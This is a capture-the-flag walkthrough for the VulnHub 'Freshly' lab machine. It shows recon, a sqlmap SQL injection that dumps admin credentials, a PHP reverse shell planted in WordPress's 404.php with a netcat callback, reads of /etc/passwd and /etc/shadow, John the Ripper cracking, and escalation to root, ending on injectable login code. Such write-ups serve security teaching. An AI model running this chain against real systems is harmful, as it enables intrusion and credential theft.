@@ -1,0 +1,652 @@
+URL : https://www.vulnhub.com/entry/tophatsec-freshly,118/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover
+ Currently scanning: 192.168.10.0/16   |   Screen View: Unique Hosts
+
+ 5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor
+ -----------------------------------------------------------------------------
+ 192.168.0.1     c4:a8:1d:2e:2d:1c    01    060   Unknown vendor
+ 192.168.0.3     08:d4:0c:22:5c:ea    02    120   Unknown vendor
+ 192.168.0.6     08:00:27:6f:1e:1c    01    060   CADMUS COMPUTER SYSTEMS
+ 192.168.0.2     3c:91:57:12:05:73    01    060   Unknown vendor
+
+[1]+  Stopped                 netdiscover
+
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.0.6
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-08-03 01:04 EDT
+Nmap scan report for 192.168.0.6
+Host is up (0.0011s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+443/tcp  open  ssl/http Apache httpd
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-02-17T03:30:05+00:00
+|_Not valid after:  2025-02-14T03:30:05+00:00
+|_ssl-date: 1986-12-27T10:47:28+00:00; -28y218d18h18m11s from local time.
+8080/tcp open  http     Apache httpd
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 08:00:27:6F:1E:1C (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.07 ms 192.168.0.6
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 40.74 seconds
+
+Enumerating port 80
+3.) Finding interesting web directories
+root@kali:~# nikto -h http://192.168.0.6/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.0.6
++ Target Hostname:    192.168.0.6
++ Target Port:        80
++ Start Time:         2015-08-03 01:09:27 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x2f 0x50f4228b8016c
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.5
++ Uncommon header 'x-webkit-csp' found, with contents: default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;
++ Uncommon header 'x-ob_mode' found, with contents: 0
++ Uncommon header 'x-content-security-policy' found, with contents: default-src 'self' ;options inline-script eval-script;img-src 'self' data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;
++ OSVDB-3233: /icons/README: Apache default file found.
++ /login.php: Admin login page/section found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 6744 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2015-08-03 01:10:09 (GMT-4) (42 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+Found directories:
+http://192.168.0.6/login.php
+http://192.168.0.6/phpmyadmin/
+
+4.) Run sqlmap on login.php page
+root@kali:~# sqlmap --url "http://192.168.0.6/login.php" --data "user=1&password=2&s=Submit" --dbs --risk=5 --level=3
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 01:17:58
+
+[01:17:59] [INFO] testing connection to the target URL
+[01:17:59] [INFO] heuristics detected web page charset 'ascii'
+[01:17:59] [INFO] testing if the target URL is stable. This can take a couple of seconds
+[01:18:00] [INFO] target URL is stable
+[01:18:00] [INFO] testing if POST parameter 'user' is dynamic
+[01:18:00] [WARNING] POST parameter 'user' does not appear dynamic
+[01:18:00] [WARNING] heuristic (basic) test shows that POST parameter 'user' might not be injectable
+[01:18:00] [INFO] testing for SQL injection on POST parameter 'user'
+[01:18:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[01:18:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[01:18:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[01:18:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)'
+[01:18:04] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'
+[01:18:05] [INFO] testing 'Generic boolean-based blind - Parameter replace (original value)'
+[01:18:05] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
+[01:18:05] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace (original value)'
+[01:18:05] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
+[01:18:05] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
+[01:18:05] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
+[01:18:05] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
+[01:18:05] [INFO] testing 'SAP MaxDB boolean-based blind - Parameter replace (original value)'
+[01:18:05] [INFO] testing 'Generic boolean-based blind - GROUP BY and ORDER BY clauses'
+[01:18:06] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'
+[01:18:06] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[01:18:06] [INFO] testing 'Oracle boolean-based blind - GROUP BY and ORDER BY clauses'
+[01:18:06] [INFO] testing 'Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses'
+[01:18:06] [INFO] testing 'Microsoft SQL Server/Sybase stacked conditional-error blind queries'
+[01:18:07] [INFO] testing 'PostgreSQL stacked conditional-error blind queries'
+[01:18:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+[01:18:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'
+[01:18:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'
+[01:18:09] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'
+[01:18:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[01:18:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
+[01:18:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[01:18:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[01:18:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[01:18:12] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
+[01:18:12] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
+[01:18:12] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause'
+[01:18:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
+[01:18:13] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause'
+[01:18:14] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
+[01:18:14] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
+[01:18:14] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause'
+[01:18:15] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
+[01:18:15] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
+[01:18:16] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'
+[01:18:16] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'
+[01:18:16] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
+[01:18:16] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
+[01:18:17] [INFO] testing 'PostgreSQL error-based - Parameter replace'
+[01:18:17] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
+[01:18:17] [INFO] testing 'Oracle error-based - Parameter replace'
+[01:18:17] [INFO] testing 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses'
+[01:18:17] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)'
+[01:18:17] [INFO] testing 'PostgreSQL error-based - GROUP BY and ORDER BY clauses'
+[01:18:17] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
+[01:18:17] [INFO] testing 'Oracle error-based - GROUP BY and ORDER BY clauses'
+[01:18:17] [INFO] testing 'MySQL inline queries'
+[01:18:17] [INFO] testing 'PostgreSQL inline queries'
+[01:18:17] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[01:18:17] [INFO] testing 'Oracle inline queries'
+[01:18:17] [INFO] testing 'SQLite inline queries'
+[01:18:17] [INFO] testing 'Firebird inline queries'
+[01:18:17] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[01:18:18] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[01:18:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[01:18:19] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
+[01:18:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
+[01:18:19] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+[01:18:20] [INFO] testing 'Firebird stacked queries (heavy query)'
+[01:18:20] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries'
+[01:18:21] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+[01:18:21] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
+[01:18:30] [INFO] POST parameter 'user' seems to be 'MySQL < 5.0.12 AND time-based blind (heavy query)' injectable 
+[01:18:30] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[01:18:30] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[01:18:30] [INFO] target URL appears to be UNION injectable with 2 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y
+[01:18:32] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. --dbms=mysql) 
+[01:18:32] [INFO] testing 'MySQL UNION query (58) - 22 to 40 columns'
+[01:18:33] [INFO] testing 'MySQL UNION query (58) - 42 to 60 columns'
+[01:18:33] [INFO] testing 'Generic UNION query (58) - 1 to 20 columns'
+[01:18:33] [INFO] testing 'Generic UNION query (58) - 22 to 40 columns'
+[01:18:34] [INFO] testing 'Generic UNION query (58) - 42 to 60 columns'
+[01:18:34] [INFO] checking if the injection point on POST parameter 'user' is a false positive
+POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection points with a total of 1267 HTTP(s) requests:
+---
+Place: POST
+Parameter: user
+    Type: AND/OR time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+    Payload: user=1' AND 5803=BENCHMARK(5000000,MD5(0x41737463)) AND 'yFbC'='yFbC&password=2&s=Submit
+---
+[01:19:26] [INFO] testing MySQL
+[01:19:26] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
+[01:19:32] [INFO] confirming MySQL
+[01:19:40] [INFO] adjusting time delay to 1 second due to good response times
+[01:19:40] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL >= 5.0.0
+[01:19:40] [INFO] fetching database names
+[01:19:40] [INFO] fetching number of databases
+[01:19:40] [INFO] retrieved: 7
+[01:19:42] [INFO] retrieved: information_schema
+[01:20:47] [INFO] retrieved: login
+[01:21:07] [INFO] retrieved: mysql
+[01:21:25] [INFO] retrieved: performance_schema
+[01:22:28] [INFO] retrieved: phpmyadmin
+[01:23:06] [INFO] retrieved: users
+[01:23:23] [INFO] retrieved: wordpress8080
+available databases [7]:
+[*] information_schema
+[*] login
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] users
+[*] wordpress8080
+
+[01:24:16] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/192.168.0.6'
+
+[*] shutting down at 01:24:16
+
+root@kali:~# sqlmap --url "http://192.168.0.6/login.php" --data "user=1&password=2&s=Submit" -D "wordpress8080" --risk=5 --level=3 --dump
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 01:26:21
+
+[01:26:22] [INFO] resuming back-end DBMS 'mysql' 
+[01:26:22] [INFO] testing connection to the target URL
+[01:26:22] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: POST
+Parameter: user
+    Type: AND/OR time-based blind
+    Title: MySQL < 5.0.12 AND time-based blind (heavy query)
+    Payload: user=1' AND 5803=BENCHMARK(5000000,MD5(0x41737463)) AND 'yFbC'='yFbC&password=2&s=Submit
+---
+[01:26:22] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5
+[01:26:22] [INFO] fetching tables for database: 'wordpress8080'
+[01:26:22] [INFO] fetching number of tables for database 'wordpress8080'
+[01:26:22] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                                                                           
+[01:26:23] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
+1
+[01:26:30] [INFO] retrieved: 
+[01:26:41] [INFO] adjusting time delay to 1 second due to good response times
+users
+[01:26:59] [INFO] fetching columns for table 'users' in database 'wordpress8080'
+[01:26:59] [INFO] retrieved: 2
+[01:27:01] [INFO] retrieved: username
+[01:27:32] [INFO] retrieved: password
+[01:28:06] [INFO] fetching entries for table 'users' in database 'wordpress8080'
+[01:28:06] [INFO] fetching number of entries for table 'users' in database 'wordpress8080'
+[01:28:06] [INFO] retrieved: 1
+[01:28:07] [INFO] retrieved: SuperSecretPass
+[01:29:11] [ERROR] invalid character detected. retrying..
+[01:29:11] [WARNING] increasing time delay to 2 seconds 
+word
+[01:29:46] [INFO] retrieved: admin
+[01:30:21] [INFO] analyzing table dump for possible password hashes
+Database: wordpress8080
+Table: users
+[1 entry]
++----------+---------------------+
+| username | password            |
++----------+---------------------+
+| admin    | SuperSecretPassword |
++----------+---------------------+
+
+[01:30:21] [INFO] table 'wordpress8080.users' dumped to CSV file '/usr/share/sqlmap/output/192.168.0.6/dump/wordpress8080/users.csv'
+[01:30:21] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/192.168.0.6'
+
+[*] shutting down at 01:30:21
+
+Enumerating 443
+5.) Fire up dirbuster on https://192.168.0.6/
+root@kali:~# dirbuster 
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: / - 200
+Dir found: /wordpress/ - 200
+Dir found: /wordpress/0/ - 200
+Dir found: /wordpress/store/ - 200
+Dir found: /wordpress/store/cart/ - 200
+Dir found: /wordpress/store/checkout/ - 200
+Dir found: /wordpress/store/express/ - 200
+Dir found: /wordpress/store/ipn/ - 200
+Dir found: /wordpress/wp-content/ - 200
+Dir found: /wordpress/store/receipt/ - 200
+Dir found: /wordpress/store/0/ - 200
+Dir found: /wordpress/store/00/ - 200
+File found: /wordpress/wp-comments-post.php - 405
+Dir found: /wordpress/store/01/ - 301
+Dir found: /wordpress/wp-content/plugins/ - 200
+Dir found: /wordpress/store/02/ - 301
+Dir found: /wordpress/store/03/ - 301
+Dir found: /wordpress/store/1/ - 200
+Dir found: /wordpress/store/10/ - 200
+Dir found: /wordpress/store/cart/0/ - 200
+Dir found: /wordpress/store/cart/00/ - 200
+Dir found: /wordpress/store/100/ - 200
+Dir found: /wordpress/store/cart/01/ - 301
+Dir found: /wordpress/store/1000/ - 200
+Dir found: /wordpress/store/cart/02/ - 301
+Dir found: /wordpress/wp-content/plugins/proplayer/ - 403
+Dir found: /wordpress/store/express/0/ - 200
+Dir found: /wordpress/store/123/ - 200
+Dir found: /wordpress/store/cart/03/ - 301
+Dir found: /wordpress/store/express/00/ - 200
+Dir found: /wordpress/store/2/ - 200
+Dir found: /wordpress/store/cart/1/ - 200
+File found: /wordpress - 301
+Dir found: /wordpress/store/express/01/ - 301
+Dir found: /wordpress/store/checkout/0/ - 200
+Exception in thread "Timer-1" java.lang.ArrayIndexOutOfBoundsException: No such child: 66
+	at java.awt.Container.getComponent(Container.java:302)
+	at com.sittinglittleduck.DirBuster.monitorThreads.ProcessChecker.run(ProcessChecker.java:183)
+	at java.util.TimerThread.mainLoop(Timer.java:534)
+	at java.util.TimerThread.run(Timer.java:484)
+Dir found: /wordpress/store/cart/10/ - 200
+Dir found: /wordpress/store/20/ - 200
+Dir found: /wordpress/store/express/02/ - 301
+Dir found: /wordpress/store/checkout/00/ - 200
+Dir found: /wordpress/store/200/ - 200
+Dir found: /wordpress/store/cart/100/ - 200
+Dir found: /wordpress/store/express/03/ - 301
+Dir found: /wordpress/store/checkout/01/ - 301
+Dir found: /wordpress/store/2000/ - 200
+Dir found: /wordpress/store/cart/1000/ - 200
+Dir found: /wordpress/store/express/1/ - 200
+Dir found: /wordpress/store/checkout/02/ - 301
+Dir found: /wordpress/store/2001/ - 200
+Dir found: /wordpress/store/cart/123/ - 200
+Dir found: /wordpress/store/cart/2/ - 200
+Dir found: /wordpress/store/cart/20/ - 200
+Dir found: /wordpress/store/express/10/ - 200
+Dir found: /wordpress/wp-content/plugins/proplayer/js/ - 403
+Dir found: /wordpress/store/checkout/03/ - 301
+Dir found: /wordpress/store/2002/ - 200
+Dir found: /wordpress/store/cart/200/ - 200
+Dir found: /wordpress/store/express/100/ - 200
+Dir found: /wordpress/store/checkout/1/ - 200
+Dir found: /wordpress/store/2003/ - 200
+Dir found: /wordpress/store/cart/2000/ - 200
+Dir found: /wordpress/store/express/1000/ - 200
+Dir found: /wordpress/store/checkout/10/ - 200
+Dir found: /wordpress/store/2004/ - 200
+Dir found: /wordpress/store/cart/2001/ - 200
+Dir found: /wordpress/store/express/123/ - 200
+Dir found: /wordpress/store/checkout/100/ - 200
+Dir found: /wordpress/store/2005/ - 200
+Dir found: /wordpress/store/cart/2002/ - 200
+Dir found: /wordpress/store/express/2/ - 200
+Dir found: /wordpress/store/3/ - 200
+Dir found: /wordpress/store/checkout/1000/ - 200
+Dir found: /wordpress/store/cart/2003/ - 200
+Dir found: /wordpress/store/express/20/ - 200
+Dir found: /wordpress/store/checkout/123/ - 200
+Dir found: /wordpress/store/cart/2004/ - 200
+Dir found: /wordpress/store/receipt/0/ - 200
+Dir found: /wordpress/store/express/200/ - 200
+Dir found: /wordpress/store/checkout/2/ - 200
+Dir found: /wordpress/store/cart/2005/ - 200
+Dir found: /wordpress/store/ipn/0/ - 200
+Dir found: /wordpress/store/receipt/00/ - 200
+Dir found: /wordpress/store/express/2000/ - 200
+Dir found: /wordpress/store/checkout/20/ - 200
+Dir found: /wordpress/store/cart/3/ - 200
+Dir found: /wordpress/store/ipn/00/ - 200
+Dir found: /wordpress/store/receipt/01/ - 301
+Dir found: /wordpress/store/express/2001/ - 200
+Dir found: /wordpress/store/checkout/200/ - 200
+Dir found: /wordpress/store/ipn/01/ - 301
+Dir found: /wordpress/store/receipt/02/ - 301
+Dir found: /wordpress/store/express/2002/ - 200
+Dir found: /wordpress/store/checkout/2000/ - 200
+
+Since it is a wordpress website the credentials found previously might be pertaining to https://192.168.0.6/wordpress/wp-login.php
+https://192.168.0.6/wordpress/wp-login.php?redirect_to=https%3A%2F%2F192.168.0.6%2Fwordpress%2Fwp-admin%2F&reauth=1
+Username : admin
+Password : SuperSecretPassword
+
+6.) Uploading a shell
+Now we have access to the admin section so we can upload a PHP shell
+Go to Appearance -> Editor and edit the 404.php page
+Replace the contents of 404.php page with contents of php reverse shell found at http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+Change the line 49 to our IP address
+$ip = '192.168.0.4';  // CHANGE THIS
+
+7.) Access the shell (Post exploitation)
+Open the page https://192.168.0.6/wordpress/404.php in the browser
+root@kali:~# nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [192.168.0.4] from (UNKNOWN) [192.168.0.6] 57494
+Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
+ 02:40:20 up 26 min,  0 users,  load average: 0.00, 0.01, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ ifconfig eth0
+eth0      Link encap:Ethernet  HWaddr 08:00:27:6f:1e:1c
+          inet addr:192.168.0.6  Bcast:192.168.0.255  Mask:255.255.255.0
+          inet6 addr: fe80::a00:27ff:fe6f:1e1c/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:5860 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:5510 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:1423345 (1.4 MB)  TX bytes:5537881 (5.5 MB)
+
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
+candycane:x:1001:1001::/home/candycane:
+# YOU STOLE MY SECRET FILE!
+# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
+$ cat /etc/shadow
+root:$6$If.Y9A3d$L1/qOTmhdbImaWb40Wit6A/wP5tY5Ia0LB9HvZvl1xAGFKGP5hm9aqwvFtDIRKJaWkN8cuqF6wMvjl1gxtoR7/:16483:0:99999:7:::
+daemon:*:16483:0:99999:7:::
+bin:*:16483:0:99999:7:::
+sys:*:16483:0:99999:7:::
+sync:*:16483:0:99999:7:::
+games:*:16483:0:99999:7:::
+man:*:16483:0:99999:7:::
+lp:*:16483:0:99999:7:::
+mail:*:16483:0:99999:7:::
+news:*:16483:0:99999:7:::
+uucp:*:16483:0:99999:7:::
+proxy:*:16483:0:99999:7:::
+www-data:*:16483:0:99999:7:::
+backup:*:16483:0:99999:7:::
+list:*:16483:0:99999:7:::
+irc:*:16483:0:99999:7:::
+gnats:*:16483:0:99999:7:::
+nobody:*:16483:0:99999:7:::
+libuuid:!:16483:0:99999:7:::
+syslog:*:16483:0:99999:7:::
+messagebus:*:16483:0:99999:7:::
+user:$6$MuqQZq4i$t/lNztnPTqUCvKeO/vvHd9nVe3yRoES5fEguxxHnOf3jR/zUl0SFs825OM4MuCWlV7H/k2QCKiZ3zso.31Kk31:16483:0:99999:7:::
+mysql:!:16483:0:99999:7:::
+candycane:$6$gfTgfe6A$pAMHjwh3aQV1lFXtuNDZVYyEqxLWd957MSFvPiPaP5ioh7tPOwK2TxsexorYiB0zTiQWaaBxwOCTRCIVykhRa/:16483:0:99999:7:::
+# YOU STOLE MY PASSWORD FILE!
+# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
+$
+
+8.) Cracking passwords
+Use JTR to crack passwords
+root@kali:~/Desktop# ls -l
+total 8
+-rw-r--r-- 1 root root 1145 Aug  3 02:49 passwd
+-rw-r--r-- 1 root root  939 Aug  3 02:49 shadow
+root@kali:~/Desktop# unshadow 
+Usage: unshadow PASSWORD-FILE SHADOW-FILE
+root@kali:~/Desktop# unshadow passwd shadow > passwords.txt
+root@kali:~/Desktop# ls -l
+total 12
+-rw-r--r-- 1 root root 1145 Aug  3 02:49 passwd
+-rw-r--r-- 1 root root 1436 Aug  3 02:51 passwords.txt
+-rw-r--r-- 1 root root  939 Aug  3 02:49 shadow
+root@kali:~/Desktop# john --single passwords.txt 
+Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
+Use the "--format=crypt" option to force loading these as that type instead
+Loaded 3 password hashes with 3 different salts (sha512crypt [32/32])
+Remaining 2 password hashes with 2 different salts
+guesses: 0  time: 0:00:00:40 DONE (Mon Aug  3 03:42:07 2015)  c/s: 41.26  trying: user1907 - user1900
+root@kali:~/Desktop# john --show passwords.txt 
+candycane:password:1001:1001::/home/candycane:
+
+1 password hash cracked, 2 left
+
+
+9.) Enumerating further
+In the shell provided by php-reverse-shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+daemon@Freshly:/$ su root
+su root
+Password: SuperSecretPassword
+
+root@Freshly:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@Freshly:/# ls -l
+ls -l
+total 72
+drwxr-xr-x   2 root root  4096 Feb 16 22:17 bin
+drwxr-xr-x   3 root root  4096 Feb 16 22:18 boot
+drwxr-xr-x  14 root root  3980 Aug  3 02:14 dev
+drwxr-xr-x  89 root root  4096 Aug  3 02:14 etc
+drwxr-xr-x   3 root root  4096 Feb 16 22:18 home
+lrwxrwxrwx   1 root root    33 Feb 16 22:07 initrd.img -> boot/initrd.img-3.13.0-45-generic
+drwxr-xr-x  22 root root  4096 Feb 16 22:17 lib
+drwx------   2 root root 16384 Feb 16 21:58 lost+found
+drwxr-xr-x   2 root root  4096 Feb 16 21:58 media
+drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
+drwxr-xr-x   3 root root  4096 Feb 16 22:29 opt
+dr-xr-xr-x 114 root root     0 Aug  3 02:14 proc
+drwx------   3 root root  4096 Feb 16 23:51 root
+drwxr-xr-x  17 root root   540 Aug  3 02:14 run
+drwxr-xr-x   2 root root  4096 Feb 16 22:19 sbin
+drwxr-xr-x   2 root root  4096 Feb 16 22:02 srv
+dr-xr-xr-x  13 root root     0 Aug  3 02:14 sys
+drwxrwxrwt   2 root root  4096 Aug  3 03:17 tmp
+drwxr-xr-x  10 root root  4096 Feb 16 22:02 usr
+drwxr-xr-x  12 root root  4096 Feb 16 22:23 var
+lrwxrwxrwx   1 root root    30 Feb 16 22:07 vmlinuz -> boot/vmlinuz-3.13.0-45-generic
+root@Freshly:/# cd /var
+cd /var
+root@Freshly:/var# ls
+ls
+backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
+root@Freshly:/var# cd www
+cd www
+root@Freshly:/var/www# ls
+ls
+html
+root@Freshly:/var/www# cd html
+cd html
+root@Freshly:/var/www/html# ls
+ls
+index.html  login.php  tumblr_mdeo27ZZjB1r6pf3eo1_500.gif
+root@Freshly:/var/www/html# cat login.php
+cat login.php
+<?php
+mysql_connect('localhost','root','SuperSecretPassword');   <---------------------DB credentials
+mysql_select_db('login');
+?>
+
+<form action="" method="post">
+<table width="50%">
+        <tr>
+                <td>User</td>
+                <td><input type="text" name="user"></td>
+        </tr>
+        <tr>
+                <td>Password</td>
+                <td><input type="password" name="password"></td>
+        </tr>
+        </table>
+                <input type="submit" value="Submit" name="s">
+        </form>
+
+<?php
+if($_POST['s']){
+        $user = $_POST['user'];
+        $pass = $_POST['password'];
+        $re = mysql_query("select * from users where user_name = '$user' and password = '$pass'");
+
+        if(mysql_num_rows($re) == 0){
+                echo '0';
+        }else{
